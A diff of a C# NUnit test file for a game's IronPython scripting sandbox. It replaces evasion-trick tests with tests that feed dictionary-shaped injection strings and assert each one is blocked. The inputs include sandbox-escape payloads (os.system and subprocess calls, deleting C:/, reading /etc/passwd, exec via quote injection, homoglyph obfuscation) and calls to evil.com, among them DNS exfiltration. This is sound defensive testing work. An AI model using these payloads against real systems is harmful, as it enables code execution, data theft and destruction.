@@ -1317,9 +1317,9 @@ namespace Octgn.Test.OctgnApp.Scripting
                 "import\u3000os", // Ideographic space
                 
                 // Mixed whitespace combinations
-                "import\t\n\r\v\f os",
-                "exec\u0020\u00A0\u2000('evil')",
-                "Player(1)\u0009\u000A;\u0020exec('evil')",
+                "import\t\n\r os",
+                "exec\t \n('print(1)')",
+                "Player(1) \t; \texec('evil')",
                 
                 // Whitespace in keywords
                 "im\u0020port os",
@@ -1342,589 +1342,499 @@ namespace Octgn.Test.OctgnApp.Scripting
         }
 
         [Test]
-        public void ExecuteFunctionSecureNoFormat_CommentBasedEvasion_BlocksCommentTricks()
+        public void ExecuteFunctionSecureNoFormat_DictionaryFileSystemAccess_BlocksFileOperations()
         {
             var exploits = new[]
             {
-                // Comments with dangerous content
-                "Player(1) # import os",
-                "Player(1) # exec('evil')",
-                "Player(1) # ; import sys; sys.exit()",
-                "Player(1) # \\nimport os\\nos.system('calc')",
-                
-                // Multi-line comment tricks
-                "Player(1) \"\"\"\nimport os\n\"\"\"",
-                "Player(1) '''\nexec('evil')\n'''",
-                
-                // Comment injection with line continuation  
-                "Player(1) \\\n# import os",
-                "Player(1) \\\r\n# exec('evil')",
-                
-                // Mixed comment styles
-                "Player(1) # comment \"\"\"\nimport os\n\"\"\"",
-                "Player(1) # comment '''\nexec('evil')\n'''",
-                
-                // Comments with escape sequences
-                "Player(1) # comment \\n import os",
-                "Player(1) # comment \\r\\n exec('evil')",
-                
-                // Docstring abuse
-                "def evil():\n    \"\"\"import os\"\"\"\n    pass",
-                "class Evil:\n    '''exec(\"malicious\")'''",
-                
-                // Comment only (should be blocked)
-                "# import os",
-                "# exec('evil')",
-                "# ; malicious code here",
-                
-                // Comments with Unicode
-                "Player(1) # comment with \\u0020import\\u0020os",
-                "Player(1) # \\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x6f\\x73", // "import os" in hex
-                
-                // Nested comment structures
-                "Player(1) # outer # inner import os",
-                "Player(1) # comment /* import os */", // C-style in Python comment
-                
-                // Comment with continuation
-                "Player(1) # comment \\\nexec('evil')",
-                "Player(1) # comment \\\r\nexec('evil')"
+                "{\"key\": open(\"test.txt\", \"w\")}",
+                "{\"malicious\": IO.File.Delete(\"C:/Test/test.txt\")}",
+                "{\"path\": \"safe\", \"exploit\": __import__(\"os\").remove(\"test.txt\")}",
+                "{\"nested\": {\"deep\": file(\"secrets.txt\")}}",
+                "{\"action\": System.IO.File.ReadAllText(\"passwords.txt\")}",
+                "{1: import os; os.system(\"del file.txt\")}",
+                "{\"key\": \"value\"; open(\"exploit.py\", \"r\")}",
+                "{\"data\": [open(\"file1.txt\"), open(\"file2.txt\")]}",
+                "{\"exploit\": {\"level1\": {\"level2\": System.IO.Directory.Delete(\"C:/\")}}}",
+                "{\"combine\": \"safe\" + open(\"file.txt\").read()}"
             };
 
             foreach (var exploit in exploits)
             {
-                Assert.Throws<ScriptSecurityException>(() => 
-                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
-                    $"Failed to block comment-based exploit: {exploit}");
-            }
-        }
-
-        #endregion
-
-        #region Advanced Evasion and Timing Attacks
-
-        [Test]
-        public void ExecuteFunctionSecureNoFormat_TimingAndSideChannelAttacks_BlocksTimingAttacks()
-        {
-            var exploits = new[]
-            {
-                // Time-based attacks
-                "time.sleep(10000)",
-                "__import__('time').sleep(10000)",
-                "threading.Event().wait(10000)",
-                "System.Threading.Thread.Sleep(10000)",
-                
-                // Resource exhaustion
-                "[0] * (10**8)", // Memory bomb
-                "range(10**8)", // Range bomb
-                "'a' * (10**8)", // String bomb
-                "while True: pass", // Infinite loop
-                "for i in range(10**8): pass", // Long loop
-                
-                // Recursive attacks
-                "def recursive(): recursive()",
-                "lambda f: f(f)",
-                "sys.setrecursionlimit(10**6)",
-                
-                // Threading attacks
-                "threading.Thread(target=exec, args=('import os',))",
-                "concurrent.futures.ThreadPoolExecutor()",
-                "multiprocessing.Process(target=exec, args=('import os',))",
-                
-                // Signal handling
-                "signal.signal(signal.SIGINT, handler)",
-                "signal.alarm(10000)",
-                
-                // I/O blocking
-                "input('blocking')", // Blocks for user input
-                "sys.stdin.read()",
-                "open('/dev/random').read(1000000)" // Potentially blocking read
-            };
-
-            foreach (var exploit in exploits)
-            {
-                Assert.Throws<ScriptSecurityException>(() => 
-                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
-                    $"Failed to block timing attack: {exploit}");
+                var ex = Assert.Throws<ScriptSecurityException>(() =>
+                    _engine.ExecuteFunctionSecureNoFormat("testFunction", exploit));
+                Assert.That(ex.SecurityReason, Contains.Substring("Invalid argument detected"),
+                    $"Dictionary file system exploit should be blocked: {exploit}");
             }
         }
 
         [Test]
-        public void ExecuteFunctionSecureNoFormat_CovertChannelAttacks_BlocksCovertChannels()
+        public void ExecuteFunctionSecureNoFormat_DictionaryImportStatements_BlocksAllImports()
         {
             var exploits = new[]
             {
-                // DNS-based exfiltration
-                "socket.gethostbyname('data.evil.com')",
-                "socket.getaddrinfo('exfil.evil.com', 80)",
-                "System.Net.Dns.GetHostAddresses('evil.com')",
-                
-                // Error-based information leakage
-                "1/0 if secret else 1/1", // Conditional exception
-                "assert secret == 'password', 'wrong'",
-                "raise ValueError(secret)",
-                
-                // Timing-based information leakage
-                "time.sleep(len(secret))",
-                "hash(secret) % 1000000", // Hash timing
-                
-                // File system probing
-                "os.path.exists('/etc/shadow')",
-                "glob.glob('/etc/*')",
-                "os.listdir('/')",
-                
-                // Process probing
-                "psutil.process_iter()",
-                "os.getpid()",
-                "os.getppid()",
-                
-                // Environment probing
-                "os.environ",
-                "sys.path",
-                "sys.modules",
-                "platform.platform()",
-                
-                // Registry access (Windows)
-                "winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE')",
-                "_winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE')",
-                
-                // WMI queries
-                "wmi.WMI().Win32_Process()",
-                "subprocess.check_output(['wmic', 'process', 'list'])"
+                "{\"module\": import os}",
+                "{\"sys\": import sys}",
+                "{\"from\": from os import system}",
+                "{\"builtin\": __import__(\"subprocess\")}",
+                "{\"dotnet\": import System}",
+                "{\"io\": from System import IO}",
+                "{\"clr\": import clr}",
+                "{\"file\": from System.IO import File}",
+                "{\"socket\": __import__(\"socket\")}",
+                "{\"importlib\": importlib.import_module(\"os\")}",
+                "{\"nested\": {\"import\": import json}}",
+                "{\"list\": [import math, import random]}",
+                "{\"key\": \"value\", \"bad\": import collections}",
+                "{1: __import__(\"pickle\"), 2: \"safe\"}",
+                "{\"safe\": \"ok\", \"danger\": from urllib import urlopen}"
             };
 
             foreach (var exploit in exploits)
             {
-                Assert.Throws<ScriptSecurityException>(() => 
-                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
-                    $"Failed to block covert channel attack: {exploit}");
+                var ex = Assert.Throws<ScriptSecurityException>(() =>
+                    _engine.ExecuteFunctionSecureNoFormat("testFunction", exploit));
+                Assert.That(ex.SecurityReason, Contains.Substring("Invalid argument detected"),
+                    $"Dictionary import exploit should be blocked: {exploit}");
             }
         }
 
         [Test]
-        public void ExecuteFunctionSecureNoFormat_SteganographyAndHiding_BlocksHiddenPayloads()
+        public void ExecuteFunctionSecureNoFormat_DictionaryCodeExecution_BlocksCodeInjection()
         {
             var exploits = new[]
             {
-                // Zero-width character hiding
-                "exec\u200B('evil')", // Zero-width space
-                "exec\u200C('evil')", // Zero-width non-joiner
-                "exec\u200D('evil')", // Zero-width joiner
-                "exec\uFEFF('evil')", // Zero-width no-break space
-                
-                // Right-to-left override (can hide malicious code)
-                "exec\u202E('evil')",
-                "import\u202Eos",
-                
-                // Look-alike character substitution
-                "еxec('evil')", // Cyrillic 'е' instead of 'e'
-                "imрort os", // Cyrillic 'р' instead of 'p'
-                "ехес('evil')", // Mixed Cyrillic
-                
-                // Homograph attacks in function names
-                "еxеc('evil')", // All Cyrillic
-                "exec\u0430('evil')", // Cyrillic 'a'
-                
-                // Hidden in string literals
-                "'normal string'; exec('hidden'); 'normal end'",
-                "\"visible\" + '; exec(\"hidden\"); ' + \"text\"",
-                
-                // Base64 hiding (even if blocked, variations)
-                "import codecs; codecs.decode('ZXhlYygnZXZpbCcp', 'base64')",
-                "'aW1wb3J0IG9z'.decode('base64')", // Python 2 style
-                
-                // ROT13 hiding
-                "import codecs; codecs.decode('vzcbeg bf', 'rot13')",
-                "codecs.encode('exec', 'rot13')",
-                
-                // Hexadecimal hiding
-                "bytes.fromhex('696d706f7274206f73').decode()",
-                "int('696d706f7274206f73', 16)",
-                
-                // Compression hiding
-                "import zlib; zlib.decompress(compressed_payload)",
-                "import gzip; gzip.decompress(payload)",
-                
-                // Pickle hiding
-                "pickle.loads(malicious_pickle)",
-                "cPickle.loads(payload)",
-                
-                // Hidden execution in formatting
-                "'{}'.format(exec('evil'))",
-                "'%s' % exec('evil')",
-                "f'{exec(\"evil\")}'",
-                
-                // Hidden in data structures
-                "{'exec': exec}['exec']('evil')",
-                "[exec][0]('evil')",
-                "(exec,)[-1]('evil')"
+                "{\"exec\": exec(\"print(1)\")}",
+                "{\"eval\": eval(\"1+1\")}",
+                "{\"compile\": compile(\"print(1)\", \"<string>\", \"exec\")}",
+                "{\"nested\": {\"exec\": exec(open(\"script.py\").read())}}",
+                "{\"input\": eval(input())}",
+                "{\"system\": __import__(\"os\").system(\"calc\")}",
+                "{\"globals\": globals()[\"__builtins__\"][\"exec\"](\"print(1)\")}",
+                "{\"locals\": locals()[\"exec\"](\"print(1)\")}",
+                "{\"array\": [exec(\"code1\"), exec(\"code2\")]}",
+                "{1: eval(\"malicious\"), \"safe\": \"value\"}",
+                "{\"key\": \"value\"; exec(\"injected_code\")}",
+                "{\"combine\": \"safe\" + eval(\"dangerous\")}",
+                "{\"nested_exploit\": {\"level1\": {\"level2\": exec(\"deep_exploit\")}}}",
+                "{\"function_call\": compile(\"import os; os.system('calc')\", \"<string>\", \"exec\")}",
+                "{\"multi_exec\": [eval(\"1\"), exec(\"print(2)\"), compile(\"3\", \"<string>\", \"eval\")]}"
             };
 
             foreach (var exploit in exploits)
             {
-                Assert.Throws<ScriptSecurityException>(() => 
-                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
-                    $"Failed to block steganography attack: {exploit}");
+                var ex = Assert.Throws<ScriptSecurityException>(() =>
+                    _engine.ExecuteFunctionSecureNoFormat("testFunction", exploit));
+                Assert.That(ex.SecurityReason, Contains.Substring("Invalid argument detected"),
+                    $"Dictionary code execution exploit should be blocked: {exploit}");
             }
         }
 
         [Test]
-        public void ExecuteFunctionSecureNoFormat_PolymorphicAndMetamorphic_BlocksCodeMutation()
+        public void ExecuteFunctionSecureNoFormat_DictionaryReflectionAttacks_BlocksReflectionAccess()
         {
             var exploits = new[]
             {
-                // Self-modifying code patterns
-                "globals()['ex' + 'ec'] = lambda x: __import__('os').system(x)",
-                "setattr(__builtins__, 'evil', exec)",
-                "vars(__builtins__)['evil'] = exec",
-                
-                // Dynamic function creation
-                "type(lambda: None)((lambda: None).__code__, {})",
-                "types.FunctionType(code_object, globals())",
-                
-                // Code object manipulation
-                "(lambda: None).__code__.replace(co_code=malicious_bytecode)",
-                "compile('exec(\"evil\")', '<string>', 'exec')",
-                
-                // String manipulation to build dangerous calls
-                "''.join(['e', 'x', 'e', 'c'])",
-                "chr(101) + chr(120) + chr(101) + chr(99)", // "exec"
-                "bytes([101, 120, 101, 99]).decode()", // "exec"
-                
-                // Reverse string building
-                "'cexe'[::-1]", // "exec" reversed
-                "'so tropmi'[::-1]", // "import os" reversed
-                
-                // Caesar cipher / ROT
-                "''.join(chr(ord(c) + 1) for c in 'dwdb')", // "exec" with Caesar +1
-                
-                // Bit manipulation
-                "'exec'.encode().hex()",
-                "int.from_bytes(b'exec', 'big')",
-                
-                // Mathematical obfuscation  
-                "chr(101) + chr(120) + chr(101) + chr(99)", // ASCII to "exec"
-                "str(chr(0x65) + chr(0x78) + chr(0x65) + chr(0x63))", // Hex to "exec"
-                
-                // List/tuple unpacking obfuscation
-                "(*'exec',)", 
-                "*['e', 'x', 'e', 'c']",
-                
-                // Dict key manipulation
-                "{'exec': exec}[list({'exec': 1}.keys())[0]]",
-                
-                // Function attribute manipulation
-                "exec.__name__", 
-                "exec.__doc__",
-                "exec.__code__",
-                
-                // Module manipulation
-                "sys.modules['builtins'].exec",
-                "importlib.import_module('builtins').exec",
-                
-                // Operator overloading for obfuscation
-                "'exec'.__class__.__name__",
-                "str.__add__('ex', 'ec')",
-                
-                // Memory address manipulation
-                "ctypes.cast(id(exec), ctypes.py_object).value"
+                "{\"getattr\": getattr(__builtins__, \"exec\")}",
+                "{\"setattr\": setattr(obj, \"attr\", value)}",
+                "{\"delattr\": delattr(obj, \"attr\")}",
+                "{\"hasattr\": hasattr(__builtins__, \"open\")}",
+                "{\"vars\": vars()}",
+                "{\"dir\": dir()}",
+                "{\"globals\": globals()}",
+                "{\"locals\": locals()}",
+                "{\"builtins\": __builtins__}",
+                "{\"type\": type(__builtins__)}",
+                "{\"nested\": {\"reflection\": getattr(object, \"__class__\")}}",
+                "{\"array\": [vars(), dir(), globals()]}",
+                "{\"mixed\": \"safe\", \"bad\": locals()}",
+                "{1: hasattr(sys, \"exit\"), 2: \"normal\"}",
+                "{\"deep\": {\"level1\": {\"level2\": type({}).__dict__}}}"
             };
 
             foreach (var exploit in exploits)
             {
-                Assert.Throws<ScriptSecurityException>(() => 
-                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
-                    $"Failed to block polymorphic attack: {exploit}");
+                var ex = Assert.Throws<ScriptSecurityException>(() =>
+                    _engine.ExecuteFunctionSecureNoFormat("testFunction", exploit));
+                Assert.That(ex.SecurityReason, Contains.Substring("Invalid argument detected"),
+                    $"Dictionary reflection exploit should be blocked: {exploit}");
             }
         }
 
         [Test]
-        public void ExecuteFunctionSecureNoFormat_ProtocolAndParsingAttacks_BlocksParsingExploits()
+        public void ExecuteFunctionSecureNoFormat_DictionaryDunderVariables_BlocksAllDunderVariables()
         {
             var exploits = new[]
             {
-                // Null byte injection
-                "exec\x00('evil')",
-                "import\x00 os",
-                "Player\x00(1)",
-                
-                // Control character injection
-                "exec\x01('evil')",
-                "import\x02os",
-                "Player\x03(1)",
-                
-                // Line ending confusion
-                "Player(1)\r\nexec('evil')",
-                "Player(1)\n\rexec('evil')",
-                "Player(1)\r\nimport os",
-                
-                // Parser confusion with mixed encodings
-                "Player(1); \u0065\u0078\u0065\u0063('evil')",
-                
-                // Long argument attack
-                "'A' * 10000",
-                "Player(" + "'A' * 10000" + ")",
-                
-                // Nested structure attacks
-                "[[[[[[exec('evil')]]]]]]",
-                "((((((exec('evil'))))))",
-                "{{{{{exec('evil'): 1}}}}}",
-                
-                // Parser stack overflow
-                new string('(', 1000) + "exec('evil')" + new string(')', 1000),
-                new string('[', 1000) + "exec('evil')" + new string(']', 1000),
-                
-                // Tokenizer confusion
-                "Player(1)#\nexec('evil')",
-                "Player(1)\\\nexec('evil')", // Line continuation
-                
-                // Quote confusion
-                "Player('1\\')\nexec('evil')",
-                "Player(\"1\\\")\nexec('evil')",
-                
-                // Encoding declaration attacks (Python)
-                "# -*- coding: utf-8 -*-\nexec('evil')",
-                "# coding=utf-8\nexec('evil')",
-                
-                // Shebang attacks
-                "#!/usr/bin/python\nexec('evil')",
-                "#!python\nexec('evil')",
-                
-                // BOM attacks
-                "\uFEFFexec('evil')", // UTF-8 BOM
-                "\uFFFEexec('evil')", // UTF-16 BOM
-                
-                // Mixed line endings
-                "Player(1)\r\nexec('evil')\n\rimport os",
-                
-                // Escaped newlines in strings
-                "Player('1\\n')\nexec('evil')",
-                
-                // Raw string confusion
-                "r'Player(1)'\nexec('evil')",
-                
-                // Format string confusion
-                "f'Player({1})'\nexec('evil')"
+                "{\"builtins\": __builtins__}",
+                "{\"import\": __import__}",
+                "{\"file\": __file__}",
+                "{\"name\": __name__}",
+                "{\"doc\": __doc__}",
+                "{\"dict\": __dict__}",
+                "{\"class\": __class__}",
+                "{\"bases\": __bases__}",
+                "{\"subclasses\": __subclasses__}",
+                "{\"module\": __module__}",
+                "{\"globals\": __globals__}",
+                "{\"locals\": __locals__}",
+                "{\"code\": __code__}",
+                "{\"closure\": __closure__}",
+                "{\"defaults\": __defaults__}",
+                "{\"annotations\": __annotations__}",
+                "{\"qualname\": __qualname__}",
+                "{\"slots\": __slots__}",
+                "{\"weakref\": __weakref__}",
+                "{\"mro\": __mro__}",
+                "{\"enter\": __enter__}",
+                "{\"exit\": __exit__}",
+                "{\"call\": __call__}",
+                "{\"getattribute\": __getattribute__}",
+                "{\"setattr\": __setattr__}",
+                "{\"delattr\": __delattr__}",
+                "{\"dir\": __dir__}",
+                "{\"format\": __format__}",
+                "{\"sizeof\": __sizeof__}",
+                "{\"reduce\": __reduce__}",
+                "{\"reduce_ex\": __reduce_ex__}",
+                "{\"getstate\": __getstate__}",
+                "{\"setstate\": __setstate__}",
+                "{\"custom_dunder\": __custom_magic__}",
+                "{\"secret_api\": __secret_api__}",
+                "{\"system_access\": __system_access__}",
+                "{\"eval_code\": __eval_code__}",
+                "{\"exec_shell\": __exec_shell__}",
+                "{\"file_ops\": __file_ops__}",
+                "{\"net_access\": __net_access__}",
+                "{\"debug_info\": __debug_info__}",
+                "{\"bypass_security\": __bypass_security__}",
+                "{\"future_feature\": __future_feature__}",
+                "{\"hidden_func\": __hidden_func__}",
+                "{\"test_dunder\": __test_dunder__}",
+                "{\"nested\": {\"dunder\": __builtins__}}",
+                "{\"array\": [__file__, __name__, __doc__]}",
+                "{\"mixed\": \"safe\", \"dangerous\": __import__}",
+                "{1: __dict__, 2: \"normal_value\"}",
+                "{\"deep_nested\": {\"level1\": {\"level2\": {\"dunder\": __class__}}}}"
             };
 
             foreach (var exploit in exploits)
             {
-                Assert.Throws<ScriptSecurityException>(() => 
-                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
-                    $"Failed to block parsing attack: {exploit}");
+                var ex = Assert.Throws<ScriptSecurityException>(() =>
+                    _engine.ExecuteFunctionSecureNoFormat("testFunction", exploit));
+                Assert.That(ex.SecurityReason, Contains.Substring("Invalid argument detected"),
+                    $"Dictionary dunder variable exploit should be blocked: {exploit}");
             }
         }
 
         [Test]
-        public void ExecuteFunctionSecureNoFormat_StateAndContextAttacks_BlocksContextManipulation()
+        public void ExecuteFunctionSecureNoFormat_DictionaryNetworkAccess_BlocksNetworkOperations()
         {
             var exploits = new[]
             {
-                // Global state manipulation
-                "globals().clear()",
-                "globals().update({'exec': evil_exec})",
-                "del globals()['__builtins__']",
-                
-                // Local state manipulation  
-                "locals().clear()",
-                "locals().update({'exec': evil_exec})",
-                
-                // Frame manipulation
-                "sys._getframe()",
-                "inspect.currentframe()",
-                "frame.f_globals",
-                "frame.f_locals",
-                
-                // Exception state manipulation
-                "sys.exc_info()",
-                "sys.last_value",
-                "sys.last_traceback",
-                
-                // Module state manipulation
-                "sys.modules.clear()",
-                "del sys.modules['os']",
-                "sys.modules['evil'] = malicious_module",
-                
-                // Import hook manipulation
-                "sys.meta_path.clear()",
-                "sys.path_hooks.clear()",
-                "sys.path.insert(0, '/evil/path')",
-                
-                // Codec manipulation
-                "codecs.register(malicious_codec)",
-                "encodings._cache.clear()",
-                
-                // Warning filter manipulation
-                "warnings.resetwarnings()",
-                "warnings.filterwarnings('ignore')",
-                
-                // Random state manipulation
-                "random.setstate(malicious_state)",
-                "numpy.random.set_state(evil_state)",
-                
-                // Hash randomization bypass
-                "os.environ['PYTHONHASHSEED'] = '0'",
-                "hash.hash_info",
-                
-                // Garbage collector manipulation
-                "gc.disable()",
-                "gc.set_debug(gc.DEBUG_UNCOLLECTABLE)",
-                "gc.get_objects()",
-                
-                // Reference counting manipulation
-                "sys.getrefcount(obj)",
-                "weakref.ref(obj, callback)",
-                
-                // Memory manipulation
-                "ctypes.string_at(address, size)",
-                "ctypes.memmove(dest, src, count)",
-                "ctypes.memset(ptr, value, size)",
-                
-                // Signal handler manipulation
-                "signal.signal(signal.SIGTERM, handler)",
-                "signal.setitimer(signal.ITIMER_REAL, 0.1)",
-                
-                // Thread local storage
-                "threading.local()",
-                "contextvars.ContextVar('evil')",
-                
-                // Audit hook manipulation
-                "sys.addaudithook(malicious_hook)",
-                "sys.audit('exec', code)"
+                "{\"url\": __import__(\"urllib\").urlopen(\"http://evil.com\")}",
+                "{\"socket\": __import__(\"socket\").socket()}",
+                "{\"requests\": import requests; requests.get(\"http://evil.com\")}",
+                "{\"http\": __import__(\"http.client\").HTTPConnection(\"evil.com\")}",
+                "{\"webclient\": System.Net.WebClient().DownloadString(\"http://evil.com\")}",
+                "{\"ftp\": __import__(\"ftplib\").FTP(\"evil.com\")}",
+                "{\"nested\": {\"network\": __import__(\"urllib2\").urlopen(\"http://malicious.com\")}}",
+                "{\"array\": [__import__(\"socket\").socket(), \"safe_value\"]}",
+                "{\"mixed\": \"safe\", \"bad\": System.Net.HttpWebRequest.Create(\"http://evil.com\")}",
+                "{1: __import__(\"telnetlib\").Telnet(\"evil.com\"), 2: \"normal\"}"
             };
 
             foreach (var exploit in exploits)
             {
-                Assert.Throws<ScriptSecurityException>(() => 
-                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
-                    $"Failed to block state manipulation attack: {exploit}");
+                var ex = Assert.Throws<ScriptSecurityException>(() =>
+                    _engine.ExecuteFunctionSecureNoFormat("testFunction", exploit));
+                Assert.That(ex.SecurityReason, Contains.Substring("Invalid argument detected"),
+                    $"Dictionary network exploit should be blocked: {exploit}");
             }
         }
 
         [Test]
-        public void ExecuteFunctionSecureNoFormat_ConcurrencyAttacks_BlocksConcurrentExploits()
+        public void ExecuteFunctionSecureNoFormat_DictionaryProcessExecution_BlocksSystemCommands()
         {
             var exploits = new[]
             {
-                // Threading exploits
-                "threading.Thread(target=exec, args=('import os',)).start()",
-                "concurrent.futures.ThreadPoolExecutor().submit(exec, 'import os')",
-                "threading.Timer(1, exec, ['import os']).start()",
-                
-                // Multiprocessing exploits
-                "multiprocessing.Process(target=exec, args=('import os',)).start()",
-                "multiprocessing.Pool().apply(exec, ('import os',))",
-                "multiprocessing.Queue().put(exec)",
-                
-                // Asyncio exploits
-                "asyncio.run(async_exec('import os'))",
-                "asyncio.create_task(coro)",
-                "asyncio.get_event_loop().run_until_complete(coro)",
-                
-                // Queue-based attacks
-                "queue.Queue().put(exec)",
-                "queue.LifoQueue().put(exec)",
-                "queue.PriorityQueue().put((1, exec))",
-                
-                // Lock manipulation
-                "threading.Lock().acquire()",
-                "threading.RLock().acquire()",
-                "threading.Semaphore().acquire()",
-                
-                // Event manipulation
-                "threading.Event().set()",
-                "threading.Condition().notify_all()",
-                "threading.Barrier(1).wait()",
-                
-                // Shared memory attacks
-                "multiprocessing.shared_memory.SharedMemory('evil')",
-                "mmap.mmap(-1, 1000)",
-                
-                // Cross-thread communication
-                "threading.current_thread()",
-                "threading.active_count()",
-                "threading.enumerate()",
-                
-                // Process communication
-                "multiprocessing.Pipe()",
-                "multiprocessing.Manager()",
-                "multiprocessing.Value('i', 0)",
-                
-                // Signal-based coordination
-                "signal.pause()",
-                "signal.sigwait([signal.SIGUSR1])",
-                
-                // Resource sharing
-                "threading.local().exec = exec",
-                "contextvars.copy_context().run(exec, 'import os')"
+                "{\"subprocess\": __import__(\"subprocess\").call([\"calc\"])}",
+                "{\"system\": __import__(\"os\").system(\"calc\")}",
+                "{\"popen\": __import__(\"os\").popen(\"dir\")}",
+                "{\"process\": System.Diagnostics.Process.Start(\"calc\")}",
+                "{\"popen2\": __import__(\"subprocess\").Popen([\"cmd\", \"/c\", \"dir\"])}",
+                "{\"execv\": __import__(\"os\").execv(\"/bin/sh\", [\"sh\"])}",
+                "{\"nested\": {\"proc\": __import__(\"subprocess\").check_output([\"whoami\"])}}",
+                "{\"array\": [__import__(\"os\").system(\"calc\"), \"safe\"]}",
+                "{\"mixed\": \"safe\", \"danger\": System.Diagnostics.Process.Start(\"notepad\")}",
+                "{1: __import__(\"subprocess\").run([\"echo\", \"test\"]), 2: \"normal\"}"
             };
 
             foreach (var exploit in exploits)
             {
-                Assert.Throws<ScriptSecurityException>(() => 
-                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
-                    $"Failed to block concurrency attack: {exploit}");
+                var ex = Assert.Throws<ScriptSecurityException>(() =>
+                    _engine.ExecuteFunctionSecureNoFormat("testFunction", exploit));
+                Assert.That(ex.SecurityReason, Contains.Substring("Invalid argument detected"),
+                    $"Dictionary process execution exploit should be blocked: {exploit}");
             }
         }
 
         [Test]
-        public void ExecuteFunctionSecureNoFormat_IronPythonMetaObjectAttacks_BlocksMetaObjectExploits()
+        public void ExecuteFunctionSecureNoFormat_DictionaryQuoteEscaping_BlocksQuoteInjection()
         {
             var exploits = new[]
             {
-                // DLR Meta Object manipulation
-                "Microsoft.Dynamic.DynamicMetaObject",
-                "Microsoft.Scripting.Actions.DynamicSiteHelpers",
-                "Microsoft.Scripting.Runtime.DynamicOperations",
-                
-                // IronPython-specific meta programming
-                "IronPython.Runtime.Types.PythonType.MakeGenericType",
-                "IronPython.Runtime.Types.ReflectedType.MakeGenericMethod",
-                "IronPython.Runtime.Operations.PythonOps.MakeClass",
-                
-                // Expression tree manipulation
-                "System.Linq.Expressions.Expression.Call",
-                "System.Linq.Expressions.Expression.Lambda",
-                "System.Linq.Expressions.Expression.Compile",
-                
-                // CallSite manipulation
-                "Microsoft.Scripting.Actions.CallSite.Create",
-                "System.Runtime.CompilerServices.CallSite.Create",
-                
-                // Dynamic method generation
-                "System.Reflection.Emit.DynamicMethod",
-                "System.Reflection.Emit.ILGenerator.Emit",
-                
-                // Lightweight code generation
-                "Microsoft.Scripting.Generation.LightLambda",
-                "Microsoft.Scripting.Generation.LightCompiler",
-                
-                // IronPython internal operations
-                "IronPython.Runtime.Builtin.exec",
-                "IronPython.Runtime.Builtin.eval",
-                "IronPython.Runtime.Builtin.compile",
-                
-                // Scope manipulation
-                "Microsoft.Scripting.Hosting.ScriptScope.SetVariable",
-                "Microsoft.Scripting.Hosting.ScriptScope.Engine",
-                
-                // Engine manipulation
-                "IronPython.Hosting.Python.CreateEngine",
-                "Microsoft.Scripting.Hosting.ScriptRuntime.CreateEngine",
-                
-                // Context manipulation
-                "IronPython.Runtime.PythonContext.CreateModule",
-                "IronPython.Runtime.CodeContext",
-                
-                // Hosting API abuse
-                "Microsoft.Scripting.Hosting.ScriptHost",
-                "Microsoft.Scripting.Hosting.ObjectOperations"
+                "{\"\\\"; exec('print(1)'); #\": \"value\"}",
+                "{\"\\\"; __import__('os').system('calc'); #\": \"exploit\"}",
+                "{\"'\"; import os; os.system('calc'); '\": \"value\"}",
+                "{\"\\\\\"; exec('malicious_code'); #\": \"data\"}",
+                "{\"'''; exec('''print(1)'''); '''\": \"content\"}",
+                "{\"\\\\\"; exec(open('evil.py').read()); #\": \"result\"}",
+                "{\"normal\": \"value\", \"\\\"; exec('code'); #\": \"bad\"}",
+                "{\"nested\": {\"\\\"; import sys; #\": \"deep_exploit\"}}",
+                "{\"array\": [\"\\\"; exec('code1'); #\", \"\\\"; exec('code2'); #\"]}"
             };
 
             foreach (var exploit in exploits)
             {
-                Assert.Throws<ScriptSecurityException>(() => 
-                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
-                    $"Failed to block meta object attack: {exploit}");
+                var ex = Assert.Throws<ScriptSecurityException>(() =>
+                    _engine.ExecuteFunctionSecureNoFormat("testFunction", exploit));
+                Assert.That(ex.SecurityReason, Contains.Substring("Invalid argument detected"),
+                    $"Dictionary quote injection exploit should be blocked: {exploit}");
+            }
+        }
+
+        [Test]
+        public void ExecuteFunctionSecureNoFormat_DictionaryStatementInjection_BlocksMultipleStatements()
+        {
+            var exploits = new[]
+            {
+                "{\"key\": 1; exec('print(1)')}",
+                "{\"value\": Player(1); import os; os.system('calc')}",
+                "{\"data\": \"test\"; __import__('sys').exit()}",
+                "{\"content\": Card(1)\\nimport os}",
+                "{\"info\": 1\\r\\nimport sys}",
+                "{\"item\": Player(1);print('injected')}",
+                "{\"arg\": \"value\"; exec(open('/etc/passwd').read())}",
+                "{\"normal\": \"safe\", \"bad\": \"value\"; import malicious_module}",
+                "{\"nested\": {\"inner\": \"data\"; exec('nested_exploit')}}",
+                "{\"array\": [\"item1\"; exec('exploit1'), \"item2\"; exec('exploit2')]}"
+            };
+
+            foreach (var exploit in exploits)
+            {
+                var ex = Assert.Throws<ScriptSecurityException>(() =>
+                    _engine.ExecuteFunctionSecureNoFormat("testFunction", exploit));
+                Assert.That(ex.SecurityReason, Contains.Substring("Invalid argument detected"),
+                    $"Dictionary statement injection exploit should be blocked: {exploit}");
+            }
+        }
+
+        [Test]
+        public void ExecuteFunctionSecureNoFormat_DictionaryKeyNameExploits_BlocksMaliciousKeys()
+        {
+            var exploits = new[]
+            {
+                "{exec('code'): \"value\"}",
+                "{eval('1+1'): \"result\"}",
+                "{__import__('os'): \"module\"}",
+                "{open('file.txt'): \"content\"}",
+                "{import sys: \"system\"}",
+                "{System.IO.File.Delete('test'): \"deleted\"}",
+                "{getattr(__builtins__, 'exec'): \"function\"}",
+                "{globals(): \"namespace\"}",
+                "{locals(): \"scope\"}",
+                "{vars(): \"variables\"}",
+                "{dir(): \"attributes\"}",
+                "{type(__builtins__): \"builtin_type\"}",
+                "{__builtins__: \"builtins\"}",
+                "{__import__: \"import_func\"}",
+                "{__file__: \"filename\"}",
+                "{compile('code', '<string>', 'exec'): \"compiled\"}",
+                "{hasattr(__builtins__, 'open'): \"check\"}",
+                "{setattr(obj, 'attr', value): \"set\"}",
